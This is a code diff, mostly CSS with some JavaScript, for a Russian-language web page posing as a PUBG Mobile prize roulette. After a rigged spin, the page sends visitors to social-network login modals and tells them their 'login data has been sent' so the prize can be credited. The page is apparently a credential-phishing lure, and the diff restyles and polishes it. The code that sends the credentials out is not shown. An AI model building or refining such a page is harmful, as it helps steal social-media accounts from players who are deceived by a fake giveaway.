@@ -363,17 +363,23 @@
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
+        /* ОБНОВЛЕННЫЙ КОНТЕЙНЕР РУЛЕТКИ */
         .roulette-container {
             position: relative;
             width: 100%;
             height: 450px;
-            background: rgba(20, 35, 60, 0.7);
-            border-radius: 20px;
+            background: rgba(20, 35, 60, 0.3);
+            border-radius: 25px;
             overflow: hidden;
             margin-bottom: 30px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
-            border: 3px solid #2a3b5a;
-            backdrop-filter: blur(5px);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.6),
+                inset 0 0 80px rgba(42, 59, 90, 0.3);
+            border: 3px solid rgba(42, 59, 90, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
         .prizes-grid {
@@ -391,159 +397,299 @@
         }
         
         .prize-item {
-            background: transparent;
-            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 0;
-            transition: all 0.3s;
-            border: none;
-            position: relative;
-        }
-        
-        .prize-item img {
-            width: 90px;
-            height: 90px;
-            object-fit: contain;
-            transition: all 0.3s;
-        }
-        
-        .prize-item:hover img {
-            transform: scale(1.1);
-        }
-        
-        .center-item {
-            grid-column: 2;
-            grid-row: 2;
-        }
-        
-        .selection-frame {
-            position: absolute;
-            border: 4px solid #2a3b5a;
-            border-radius: 12px;
-            box-shadow: 0 0 25px #2a3b5a, 
-                        0 0 35px rgba(42, 59, 90, 0.7),
-                        inset 0 0 20px rgba(42, 59, 90, 0.4);
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 10;
-            pointer-events: none;
-            opacity: 0;
-            background: rgba(42, 59, 90, 0.2);
-            backdrop-filter: blur(3px);
-        }
-        
-        .selection-frame.active {
-            opacity: 1;
-            animation: pulse 1.5s infinite alternate;
-        }
-        
-        @keyframes pulse {
-            from {
-                box-shadow: 0 0 25px #2a3b5a, 
-                            0 0 35px rgba(42, 59, 90, 0.7),
-                            inset 0 0 20px rgba(42, 59, 90, 0.4);
-            }
-            to {
-                box-shadow: 0 0 30px #3a4b6a, 
-                            0 0 45px rgba(58, 75, 106, 0.8),
-                            inset 0 0 25px rgba(42, 59, 90, 0.5);
-            }
-        }
-        
-        /* НОВАЯ КНОПКА "ИГРАТЬ" в стиле PUBG */
-        .pubg-play-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 300px;
-            height: 85px;
-            text-decoration: none;
+            border: 2px solid transparent;
             position: relative;
             overflow: hidden;
-            border: 4px solid #f3ab18; 
-            border-radius: 5px;
-            background: url('img.vladtime.ru') center/cover no-repeat;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 0 20px rgba(243, 171, 24, 0.3), inset 0 0 20px rgba(0,0,0,0.5);
-            cursor: pointer;
-            margin-bottom: 35px;
-            z-index: 10;
         }
-
-        .pubg-play-btn::before {
+        
+        .prize-item::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.6));
-            transition: background 0.3s ease;
+            background: linear-gradient(135deg, rgba(42, 59, 90, 0.3), transparent);
+            border-radius: 13px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 176, 0, 0.3);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-item:hover::before {
+            opacity: 1;
+        }
+        
+        .prize-item img {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            transition: all 0.4s;
+            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
             z-index: 1;
         }
-
-        .pubg-play-btn-text {
-            position: relative;
-            z-index: 2;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            font-size: 28px;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 3px 3px 5px rgba(0, 0, 0, 1);
-            font-style: italic;
+        
+        .prize-item:hover img {
+            transform: scale(1.15) rotate(5deg);
         }
-
-        .pubg-play-btn:hover {
-            transform: scale(1.08);
-            box-shadow: 0 0 35px rgba(243, 171, 24, 0.6);
-            border-color: #fff;
+        
+        .center-item {
+            grid-column: 2;
+            grid-row: 2;
+            background: none;
+            border: none;
         }
-
-        .pubg-play-btn:hover::before {
-            background: rgba(0, 0, 0, 0.1);
+        
+        .center-item img {
+            width: 80px;
+            height: 80px;
+            filter: drop-shadow(0 0 15px rgba(255, 176, 0, 0.5));
+            opacity: 0.8;
         }
-
-        .pubg-play-btn::after {
-            content: "";
+        
+        /* НОВАЯ РАМКА ВЫБОРА - УЛУЧШЕННЫЙ ДИЗАЙН */
+        .selection-frame {
             position: absolute;
-            top: -50%;
-            left: -60%;
-            width: 20%;
-            height: 200%;
-            background: rgba(255, 255, 255, 0.2);
-            transform: rotate(30deg);
-            transition: all 0.5s;
-            z-index: 2;
-        }
-
-        .pubg-play-btn:hover::after {
-            left: 120%;
-        }
-
-        .pubg-play-btn:active {
-            transform: scale(0.95);
+            border: 3px solid #ffb000;
+            border-radius: 20px;
+            box-shadow: 
+                0 0 30px rgba(255, 176, 0, 0.8),
+                0 0 60px rgba(255, 176, 0, 0.4),
+                inset 0 0 30px rgba(255, 176, 0, 0.2);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100;
+            pointer-events: none;
+            opacity: 0;
+            background: rgba(255, 176, 0, 0.15);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        .pubg-play-btn:disabled {
-            opacity: 0.6;
+        .selection-frame::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 24px;
+            animation: borderRotate 4s linear infinite;
+            pointer-events: none;
+        }
+        
+        .selection-frame::after {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            pointer-events: none;
+        }
+        
+        /* Уголки рамки */
+        .corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffb000;
+            opacity: 0.8;
+        }
+        
+        .corner-tl {
+            top: -5px;
+            left: -5px;
+            border-right: none;
+            border-bottom: none;
+            border-top-left-radius: 8px;
+        }
+        
+        .corner-tr {
+            top: -5px;
+            right: -5px;
+            border-left: none;
+            border-bottom: none;
+            border-top-right-radius: 8px;
+        }
+        
+        .corner-bl {
+            bottom: -5px;
+            left: -5px;
+            border-right: none;
+            border-top: none;
+            border-bottom-left-radius: 8px;
+        }
+        
+        .corner-br {
+            bottom: -5px;
+            right: -5px;
+            border-left: none;
+            border-top: none;
+            border-bottom-right-radius: 8px;
+        }
+        
+        .selection-frame.active {
+            opacity: 1;
+            animation: 
+                pulse 1.2s infinite alternate,
+                glow 2s infinite alternate;
+        }
+        
+        @keyframes borderRotate {
+            0% { border-color: rgba(255, 255, 255, 0.3); }
+            25% { border-color: rgba(255, 176, 0, 0.5); }
+            50% { border-color: rgba(255, 255, 255, 0.3); }
+            75% { border-color: rgba(255, 176, 0, 0.5); }
+            100% { border-color: rgba(255, 255, 255, 0.3); }
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 
+                    0 0 30px rgba(255, 176, 0, 0.8),
+                    0 0 60px rgba(255, 176, 0, 0.4),
+                    inset 0 0 30px rgba(255, 176, 0, 0.2);
+            }
+            100% {
+                transform: scale(1.03);
+                box-shadow: 
+                    0 0 40px rgba(255, 176, 0, 1),
+                    0 0 80px rgba(255, 176, 0, 0.6),
+                    inset 0 0 40px rgba(255, 176, 0, 0.3);
+            }
+        }
+        
+        @keyframes glow {
+            0% {
+                background: rgba(255, 176, 0, 0.15);
+            }
+            100% {
+                background: rgba(255, 176, 0, 0.25);
+            }
+        }
+        
+        /* ИНДИКАТОР ВЫБОРА */
+        .selection-indicator {
+            position: absolute;
+            top: -40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ffb000, #ff8000);
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 14px;
+            white-space: nowrap;
+            box-shadow: 0 5px 15px rgba(255, 128, 0, 0.4);
+            z-index: 101;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .selection-indicator::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-top: 10px solid #ffb000;
+        }
+        
+        .selection-indicator.show {
+            opacity: 1;
+        }
+        
+        /* КНОПКА ИГРАТЬ - УЛУЧШЕННЫЙ ДИЗАЙН */
+        .play-btn {
+            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
+            color: #000;
+            border: none;
+            border-radius: 60px;
+            padding: 22px 50px;
+            font-size: 24px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 
+                0 10px 30px rgba(255, 128, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-bottom: 35px;
+            width: 85%;
+            max-width: 350px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .play-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
+        }
+        
+        .play-btn:hover:not(:disabled) {
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 
+                0 20px 40px rgba(255, 128, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            letter-spacing: 3px;
+        }
+        
+        .play-btn:hover::before {
+            left: 100%;
+        }
+        
+        .play-btn:active:not(:disabled) {
+            transform: translateY(-2px) scale(0.98);
+        }
+        
+        .play-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
             cursor: not-allowed;
-            transform: none !important;
-            border-color: #666;
-            box-shadow: 0 0 10px rgba(243, 171, 24, 0.1) !important;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        .pubg-play-btn:disabled:hover::after {
-            left: -60%;
+        .play-btn i {
+            margin-right: 10px;
+            font-size: 22px;
         }
         
-        .pubg-play-btn:disabled .pubg-play-btn-text {
-            opacity: 0.7;
-        }
-        
-        /* Форма выбора соцсети */
+        /* ФОРМА ВЫБОРА СОЦСЕТИ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .social-select-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -552,124 +698,194 @@
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(42, 59, 90, 0.4);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 176, 0, 0.3);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             backdrop-filter: blur(10px);
+            transition: all 0.6s ease;
         }
         
         .social-select-section.active {
             display: block;
-            animation: fadeInUp 0.6s ease;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
-        @keyframes fadeInUp {
+        @keyframes slideInUp {
             from { 
                 opacity: 0; 
-                transform: translateY(30px); 
+                transform: translateY(30px) scale(0.95); 
             }
             to { 
                 opacity: 1; 
-                transform: translateY(0); 
+                transform: translateY(0) scale(1); 
             }
         }
         
         .social-select-section h2 {
-            color: #8da1b5;
+            color: #ffb000;
             text-align: center;
             margin-bottom: 20px;
-            font-size: 22px;
-            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-family: 'Orbitron', sans-serif;
             font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .social-select-section p {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
         }
         
         .social-grid {
-            display: flex;
-            justify-content: center;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
-            flex-wrap: wrap;
         }
         
         .social-option {
             background: rgba(12, 26, 45, 0.7);
-            border-radius: 12px;
-            padding: 15px;
+            border-radius: 15px;
+            padding: 20px 15px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             border: 2px solid transparent;
-            width: 120px;
-            backdrop-filter: blur(5px);
-        }
-        
-        .social-option:hover {
-            transform: translateY(-3px);
-            border-color: #2a3b5a;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            background: rgba(42, 59, 90, 0.5);
-        }
-        
-        .social-option.selected {
-            border-color: #2a3b5a;
-            background: rgba(42, 59, 90, 0.7);
-            box-shadow: 0 0 15px rgba(42, 59, 90, 0.5);
-        }
-        
-        .social-icon {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 8px;
+            position: relative;
             overflow: hidden;
         }
         
-        .social-icon img {
+        .social-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(255, 176, 0, 0.1), transparent);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .social-option:hover {
+            transform: translateY(-5px) scale(1.05);
+            border-color: rgba(255, 176, 0, 0.5);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .social-option:hover::before {
+            opacity: 1;
+        }
+        
+        .social-option.selected {
+            border-color: #ffb000;
+            background: rgba(255, 176, 0, 0.1);
+            box-shadow: 
+                0 0 20px rgba(255, 176, 0, 0.4),
+                inset 0 0 10px rgba(255, 176, 0, 0.1);
+            transform: scale(1.05);
+        }
+        
+        .social-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            overflow: hidden;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            transition: all 0.3s;
+        }
+        
+        .social-icon img, .social-icon svg {
             width: 100%;
             height: 100%;
             object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
+        }
+        
+        .social-option.selected .social-icon {
+            background: rgba(255, 176, 0, 0.2);
+            transform: scale(1.1);
         }
         
         .social-option span {
-            font-weight: 500;
+            font-weight: 600;
             font-size: 14px;
             color: #8da1b5;
             font-family: Arial, sans-serif;
+            transition: color 0.3s;
         }
         
+        .social-option.selected span {
+            color: #ffb000;
+            font-weight: 700;
+        }
+        
+        /* КНОПКА ПОЛУЧИТЬ ПРИЗ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .get-prize-btn {
-            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
-            color: #8da1b5;
+            background: linear-gradient(180deg, #ffb000 0%, #ff8000 100%);
+            color: #000;
             border: none;
             border-radius: 60px;
-            padding: 18px 30px;
+            padding: 20px 40px;
             font-size: 20px;
-            font-weight: 500;
+            font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
-            transition: all 0.3s;
+            box-shadow: 
+                0 10px 30px rgba(255, 128, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             width: 100%;
-            font-family: Arial, sans-serif;
-            letter-spacing: 1px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1.5px;
             text-transform: uppercase;
             margin-top: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            backdrop-filter: blur(5px);
-            border: 2px solid rgba(42, 59, 90, 0.5);
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .get-prize-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
         }
         
         .get-prize-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
-            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
+            transform: translateY(-5px);
+            box-shadow: 
+                0 15px 35px rgba(255, 128, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            letter-spacing: 2px;
+        }
+        
+        .get-prize-btn:hover::before {
+            left: 100%;
         }
         
         .get-prize-btn:disabled {
@@ -680,30 +896,52 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Секция подтверждения получения приза */
+        .get-prize-btn i {
+            font-size: 20px;
+        }
+        
+        /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ - УЛУЧШЕННЫЙ ДИЗАЙН */
         .confirmation-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
-            padding: 30px 25px;
+            padding: 40px 30px;
             width: 100%;
             max-width: 600px;
             display: none;
             margin-top: 20px;
-            border: 2px solid rgba(42, 59, 90, 0.4);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(76, 175, 80, 0.3);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                inset 0 0 30px rgba(42, 59, 90, 0.2);
             text-align: center;
             backdrop-filter: blur(10px);
         }
         
         .confirmation-section.active {
             display: block;
-            animation: fadeInUp 0.6s ease;
+            animation: slideInUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .confirmation-icon {
-            font-size: 60px;
-            color: #8da1b5;
+            font-size: 80px;
+            color: #4CAF50;
             margin-bottom: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+        
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+        
+        .confirmation-section h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+            font-size: 28px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
         
         .confirmation-message {
@@ -712,9 +950,58 @@
             line-height: 1.6;
             margin-bottom: 25px;
             font-family: Arial, sans-serif;
+            padding: 20px;
+            background: rgba(76, 175, 80, 0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(76, 175, 80, 0.3);
         }
         
-        /* Модальные окна для входа */
+        /* УВЕДОМЛЕНИЯ - УЛУЧШЕННЫЙ ДИЗАЙН */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #2a3b5a, #1a2c42);
+            color: #ffb000;
+            padding: 20px 30px;
+            border-radius: 15px;
+            border-left: 5px solid #ffb000;
+            box-shadow: 
+                0 10px 25px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            display: none;
+            z-index: 1001;
+            max-width: 350px;
+            animation: slideInRight 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-family: Arial, sans-serif;
+            backdrop-filter: blur(10px);
+            font-weight: 500;
+        }
+        
+        .notification.error {
+            color: #ff4444;
+            border-left-color: #ff4444;
+            background: linear-gradient(135deg, #5a1a1a, #3a0a0a);
+        }
+        
+        .notification.success {
+            color: #4CAF50;
+            border-left-color: #4CAF50;
+            background: linear-gradient(135deg, #1a5a1a, #0a3a0a);
+        }
+        
+        @keyframes slideInRight {
+            from { 
+                transform: translateX(100%) scale(0.8); 
+                opacity: 0; 
+            }
+            to { 
+                transform: translateX(0) scale(1); 
+                opacity: 1; 
+            }
+        }
+        
+        /* ОСТАЛЬНЫЕ СТИЛИ (остаются без изменений) */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -1585,7 +1872,7 @@
         }
         
         .footer-link:hover {
-            color: #2a3b5a;
+            color: #ffb000;
         }
         
         .copyright {
@@ -1595,29 +1882,6 @@
             line-height: 1.5;
             font-weight: 400;
             font-family: Arial, sans-serif;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #2a3b5a;
-            color: #8da1b5;
-            padding: 15px 25px;
-            border-radius: 10px;
-            border-left: 5px solid #2a3b5a;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            display: none;
-            z-index: 1001;
-            max-width: 300px;
-            animation: slideIn 0.5s ease;
-            font-family: Arial, sans-serif;
-            backdrop-filter: blur(5px);
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
         }
         
         @media (max-width: 600px) {
@@ -1631,15 +1895,9 @@
                 height: 70px;
             }
             
-            .pubg-play-btn {
-                width: 250px;
-                height: 70px;
-                margin-bottom: 25px;
-            }
-            
-            .pubg-play-btn-text {
-                font-size: 22px;
-                letter-spacing: 2px;
+            .play-btn {
+                padding: 18px 30px;
+                font-size: 20px;
             }
             
             .header h1 {
@@ -1651,17 +1909,17 @@
             }
             
             .social-grid {
+                grid-template-columns: repeat(2, 1fr);
                 gap: 10px;
             }
             
             .social-option {
-                width: 100px;
-                padding: 12px;
+                padding: 15px 10px;
             }
             
             .social-icon {
-                width: 40px;
-                height: 40px;
+                width: 50px;
+                height: 50px;
             }
             
             .logo {
@@ -1700,6 +1958,12 @@
                 width: 18px;
                 height: 18px;
                 font-size: 10px;
+            }
+            
+            .selection-indicator {
+                font-size: 12px;
+                padding: 6px 15px;
+                top: -35px;
             }
         }
     </style>
@@ -2016,18 +2280,24 @@
                 </div>
             </div>
             
-            <div class="selection-frame" id="selectionFrame"></div>
+            <!-- Новая рамка с индикатором -->
+            <div class="selection-frame" id="selectionFrame">
+                <div class="corner corner-tl"></div>
+                <div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div>
+                <div class="corner corner-br"></div>
+            </div>
+            <div class="selection-indicator" id="selectionIndicator">ВЫБРАНО</div>
         </div>
         
-        <!-- НОВАЯ КНОПКА "ИГРАТЬ" в стиле PUBG -->
-        <button class="pubg-play-btn" id="playBtn">
-            <span class="pubg-play-btn-text">ИГРАТЬ</span>
+        <button class="play-btn" id="playBtn">
+            <i class="fas fa-play"></i> ИГРАТЬ
         </button>
         
         <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
             <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
-            <p style="text-align: center; margin-bottom: 20px; color: #8da1b5; font-family: Arial, sans-serif;">Выберите социальную сеть для получения приза</p>
+            <p>Выберите социальную сеть для получения приза</p>
             
             <div class="social-grid">
                 <div class="social-option" data-social="vk" onclick="openModal('vkModal')">
@@ -2075,7 +2345,7 @@
             <div class="confirmation-icon">
                 <i class="fas fa-check-circle"></i>
             </div>
-            <h2 style="color: #8da1b5; margin-bottom: 20px; font-family: Arial, sans-serif;">ЗАЯВКА ПРИНЯТА!</h2>
+            <h2>ЗАЯВКА ПРИНЯТА!</h2>
             
             <div class="confirmation-message">
                 Ваш выигрыш будет зачислен на аккаунт PUBG Mobile<br>
@@ -2230,6 +2500,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
+            const selectionIndicator = document.getElementById('selectionIndicator');
             const socialSelectSection = document.getElementById('socialSelectSection');
             const confirmationSection = document.getElementById('confirmationSection');
             const getPrizeBtn = document.getElementById('getPrizeBtn');
@@ -2306,7 +2577,7 @@
                 
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
-                document.querySelector('.pubg-play-btn-text').textContent = t.play;
+                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
@@ -2338,10 +2609,18 @@
             });
             
             // Функция показа уведомления
-            function showNotification(message, isError = false) {
+            function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
-                notification.style.background = isError ? '#5a1a1a' : '#2a3b5a';
-                notification.style.borderLeftColor = isError ? '#ff4444' : '#2a3b5a';
+                notification.classList.remove('error', 'success');
+                
+                if (isError) {
+                    notification.classList.add('error');
+                } else if (isSuccess) {
+                    notification.classList.add('success');
+                } else {
+                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
+                }
+                
                 notification.style.display = 'block';
                 
                 setTimeout(() => {
@@ -2365,6 +2644,20 @@
                 selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
                 selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                 selectionFrame.classList.add('active');
+                
+                // Позиционирование индикатора
+                selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
+                selectionIndicator.style.top = rect.top - containerRect.top - 35 + 'px';
+            }
+            
+            // Функция показа/скрытия индикатора
+            function showSelectionIndicator(show) {
+                if (show) {
+                    selectionIndicator.classList.add('show');
+                    selectionIndicator.textContent = 'ВЫБРАНО';
+                } else {
+                    selectionIndicator.classList.remove('show');
+                }
             }
             
             // Функция запуска рулетки
@@ -2380,6 +2673,7 @@
                 playBtn.disabled = true;
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
+                showSelectionIndicator(false);
                 
                 finalPrizeIndex = getRandomPrize();
                 
@@ -2389,7 +2683,7 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                spinSpeed = 100;
+                spinSpeed = 80; // Быстрее начальная скорость
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -2402,8 +2696,9 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
+                // Замедление в конце
                 if (spinCount > totalSpins * 0.7) {
-                    spinSpeed += 20;
+                    spinSpeed += 15;
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
@@ -2418,6 +2713,7 @@
                     
                     setTimeout(() => {
                         moveFrameToPrize(finalPrizeIndex);
+                        showSelectionIndicator(true);
                         
                         setTimeout(() => {
                             isSpinning = false;
@@ -2430,7 +2726,8 @@
                             updatePrizeBadge();
                             
                             hasPlayed = true;
-                            playBtn.innerHTML = '<span class="pubg-play-btn-text">УЖЕ ИГРАЛИ</span>';
+                            playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                            playBtn.disabled = false;
                             
                             // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -2440,7 +2737,7 @@
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             
-                            showNotification(`Поздравляем! Вы выиграли: ${userPrize.name}`);
+                            showNotification(`🎉 Поздравляем! Вы выиграли: ${userPrize.name}`, false, true);
                         }, 1000);
                     }, 300);
                 }
@@ -2485,7 +2782,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2506,7 +2803,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2526,7 +2823,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2562,7 +2859,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2689,6 +2986,7 @@
             
             // Инициализация
             selectionFrame.style.opacity = '0';
+            selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
             // Предзагрузка изображений
